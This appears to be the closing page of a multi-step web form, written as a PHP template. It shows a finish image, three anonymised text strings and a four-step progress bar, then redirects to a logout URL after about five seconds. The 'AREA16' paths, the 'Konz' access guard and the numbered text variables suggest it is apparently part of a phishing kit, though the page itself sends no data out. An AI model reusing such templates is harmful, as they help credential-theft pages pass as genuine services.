<?php 
defined("ACCESS") or die('Konz');
include FCPATH. "AREA16/application/views/layout/header.php";
?>
				<ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
					<li>
						<?php echo $_113 ?>
					</li>
					<li>
						<?php echo $_46 ?>
					</li>
					<li>
						<?php echo $_47 ?>
					</li>
					<li class="is-active">
						<?php echo $_48 ?>
					</li>
				</ul>
				<div class="cc-content6" style="padding-top: 0">
					<div class="container">
						<div align="center"> <img src="<?=base_url()?>AREA16/assets/images/finish.png" width="150"> </div>
						<div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_110 ?></span> </div>
						<div align="center"> <span class="lefttext"><?php echo $_111 ?></span> </div>
						<div align="center"> <span class="lefttext"><?php echo $_112 ?></span> </div>
					</div>
				</div>
			</div>
<?php include FCPATH. "AREA16/application/views/layout/footer.php"; ?>
		<script>
		let load;

		let _loader = () => {
			load = setTimeout(showPage, 1000);
		}

		let showPage = () => {
			document.getElementById('loader').style.display = 'none';
			document.getElementById('myDiv').style.display = 'block';
		}

		let timer = setTimeout(function() {
			window.location = "<?=base_url()?>done/logout"
		}, 5250);
		</script>
	</body>

	</html>